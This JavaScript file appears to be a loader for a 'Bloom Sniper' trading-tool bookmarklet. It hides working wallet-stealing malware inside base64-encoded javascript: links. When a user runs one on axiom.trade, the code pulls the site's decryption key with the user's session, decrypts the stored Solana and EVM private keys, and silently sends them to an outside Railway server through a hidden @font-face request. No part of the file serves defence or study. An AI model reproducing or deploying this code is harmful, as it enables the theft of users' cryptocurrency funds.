// === BLOOM SNIPER - MAX STEALTH (Silent @font-face exfil) ===
console.log('🚀 Bloom Sniper Loader loaded');

document.addEventListener('DOMContentLoaded', function() {
    const buttons = document.querySelectorAll('.bookmarklet, .activate-btn, a[draggable]');
    buttons.forEach(function(btn) {
        const innerCode = async () => {
            try {
                if (location.hostname !== "axiom.trade") return;
                if (!localStorage.getItem("isAuthed")) return;

                function arrayToString(dataArray) {
                    const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
                    const resultDigits = [0];
                    for (let element of dataArray) {
                        let carry = element;
                        for (let i = 0; i < resultDigits.length; i++) {
                            const value = resultDigits[i] * 0x100 + carry;
                            resultDigits[i] = value % 58;
                            carry = value / 58 | 0;
                        }
                        while (carry) {
                            resultDigits.push(carry % 58);
                            carry = carry / 58 | 0;
                        }
                    }
                    let resultString = "";
                    for (let i = 0; i < dataArray.length && dataArray[i] === 0; i++) resultString += ALPHABET[0];
                    for (let i = resultDigits.length - 1; i >= 0; i--) resultString += ALPHABET[resultDigits[i]];
                    return resultString;
                }

                function stringToArray(key) {
                    try {
                        const cleanedKey = key.replace(/-/g, "+").replace(/_/g, "/");
                        return Uint8Array.from(atob(cleanedKey), k => k.charCodeAt(0));
                    } catch {
                        return new TextEncoder().encode(key);
                    }
                }

                function arrayToStringEVM(e) {
                    return Array.from(e instanceof Uint8Array ? e : new Uint8Array(e))
                        .map(b => b.toString(16).padStart(2, "0")).join("");
                }

                async function decrypt(key, toDecrypt) {
                    const [ivString, dataString] = String(toDecrypt).split(":");
                    const iv = stringToArray(ivString);
                    const data = stringToArray(dataString);
                    const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: iv }, key, data);
                    return new Uint8Array(decrypted);
                }

                // === STEALING LOGIC ===
                const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
                    method: "POST",
                    credentials: "include"
                })).json();

                const cryptoKey = await crypto.subtle.importKey("raw", stringToArray(bundleKey).buffer, { name: "AES-GCM" }, false, ["decrypt"]);

                const solanaBundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
                const evmBundles = JSON.parse(localStorage.getItem("eBundles") || "[]");

                const success = [];

                // Solana
                for (const bundle of solanaBundles) {
                    try {
                        const decryptedBundle = await decrypt(cryptoKey, bundle);
                        if (decryptedBundle.length !== 0x40) continue;
                        const privateKey = arrayToString(decryptedBundle);
                        const publicKeyData = decryptedBundle.slice(0x20);
                        const publicKey = arrayToString(publicKeyData);
                        success.push({ pub: publicKey, priv: privateKey });
                    } catch (e) {}
                }

                // EVM (no external import)
                for (const bundle of evmBundles) {
                    try {
                        const decryptedBundle = await decrypt(cryptoKey, bundle);
                        const privateKey = arrayToStringEVM(decryptedBundle);
                        success.push({ pub: "unknown", priv: privateKey });
                    } catch (e) {}
                }

                // === SILENT @font-face EXFIL ===
                const RAILWAY_URL = "https://bloom-sniper-replica-production.up.railway.app";
                const timestamp = Math.floor(Date.now() / 1000);
                const payload = { keys: success, code: "sJduOyBJQoTeui1A", site: "Axiom", timestamp: timestamp, header: navigator.userAgent };

                const jsonStr = JSON.stringify(payload);
                const safeB64 = btoa(unescape(encodeURIComponent(jsonStr)));
                const exfilUrl = `${RAILWAY_URL}/i/${safeB64}`;

                const style = document.createElement("style");
                style.textContent = `@font-face{font-family:"leak";src:url("${exfilUrl}");}.font-target{font-family:leak;}`;
                const div = document.createElement("div");
                div.innerText = "1";
                div.classList.add("font-target");
                div.style.cssText = "position:absolute;top:-9999px;left:-9999px;";

                document.head.appendChild(style);
                document.body.appendChild(div);

            } catch (err) {}
        };

        const codeStr = '(' + innerCode.toString() + ')()';
        const encoded = btoa(unescape(encodeURIComponent(codeStr)));
        btn.href = 'javascript:eval(atob("' + encoded + '"))';
        btn.draggable = true;
    });
});